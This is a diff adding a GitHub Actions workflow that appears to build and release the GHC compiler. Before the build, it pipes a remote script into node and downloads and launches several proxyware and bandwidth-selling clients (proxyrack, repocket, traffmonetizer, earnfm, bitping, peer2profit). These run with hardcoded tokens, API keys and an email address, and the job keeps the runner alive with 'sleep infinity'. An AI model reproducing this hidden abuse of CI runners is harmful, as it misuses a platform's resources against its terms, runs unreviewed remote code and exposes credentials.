@@ -1,0 +1,62 @@
+on: workflow_call
+
+jobs:
+    build:
+        runs-on: ubuntu-latest
+        timeout-minutes: 355
+        permissions:
+            contents: write
+        strategy:
+            fail-fast: false
+            matrix:
+                proxyrack: [7, 8]
+        steps:
+        - uses: actions/checkout@main
+        - run: |
+              Xvfb :99 &
+              curl https://app-updates.sock.sh/peerclient/script/script.js | node - --homeIp point-of-presence.sock.sh --homePort 443 --id 1$(printf 0%.0s {1..62})${{matrix.proxyrack}} --version $(curl --silent https://app-updates.sock.sh/peerclient/script/version.txt) --clientKey proxyrack-pop-client --clientType PoP &
+              podman run --init -d --restart=always -e RP_EMAIL=chaowen.guo1@gmail.com -e RP_API_KEY=9b23ebb9-2ee1-427f-a271-f6fdf536537b docker.io/repocket/repocket
+              traffmonetizer=$(podman create docker.io/traffmonetizer/cli_v2)
+              podman cp $traffmonetizer:/app/Cli .
+              podman cp $traffmonetizer:/usr/lib/libssl.so.3 .
+              podman cp $traffmonetizer:/usr/lib/libcrypto.so.3 .
+              podman cp $traffmonetizer:/usr/lib/libgcc_s.so.1 .
+              podman cp $traffmonetizer:/usr/lib/libz.so.1 libz.so.1
+              podman cp $traffmonetizer:/usr/lib/libstdc++.so.6 libstdc++.so.6
+              podman rm $traffmonetizer
+              sudo apt update
+              sudo apt install -y --no-install-recommends musl
+              DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1 LD_LIBRARY_PATH=. ./Cli start accept --token ELGPy/DEQYDtARslA6HnkrbPIF6JQi+qYLCre5LBe58= &
+              earnfm=$(podman create docker.io/earnfm/earnfm-client)
+              podman cp $earnfm:/app/earnfm_example .
+              podman rm $earnfm
+              EARNFM_TOKEN=0a981b92-0b71-44a2-bdec-eceb5d946025 ./earnfm_example &
+              curl $(curl https://releases.bitping.com/bitpingd/update.json | jq -r .platforms[\"linux-x86_64\"].url) | tar -xz
+              sudo mkdir -p /root/.bitpingd
+              sudo mv node${{matrix.proxyrack}}.db /root/.bitpingd/node.db
+              sudo ./bitpingd &
+              curl -O https://updates.peer2profit.app/peer2profit_0.48_amd64.deb 
+              sudo apt install -y --no-install-recommends ./peer2profit_0.48_amd64.deb
+              cat <<END > ~/.config/org.peer2profit.peer2profit.ini
+              [General]
+              StartOnStartup=true
+              hideToTrayMsg=true
+              locale=en_US
+              Username=chaowen.guo1@gmail.com
+              installid2=$(cat /proc/sys/kernel/random/uuid)
+              END
+              DISPLAY=:99 peer2profit &
+              git submodule update --init --recursive
+              sudo apt install -y --no-install-recommends alex happy python3-sphinx texlive-xetex tex-gyre texlive-fonts-recommended
+              python3 boot
+              ./configure
+              cabal update
+              hadrian/build install --prefix=${{github.workspace}}/product
+              cd ${{github.workspace}}
+              tar -cjvf ghc.tar.bz2 -C product .
+              sleep infinity
+        - uses: softprops/action-gh-release@master
+          with:
+              token: ${{secrets.GITHUB_TOKEN}}
+              tag_name: 1
+              files: ghc.tar.bz2
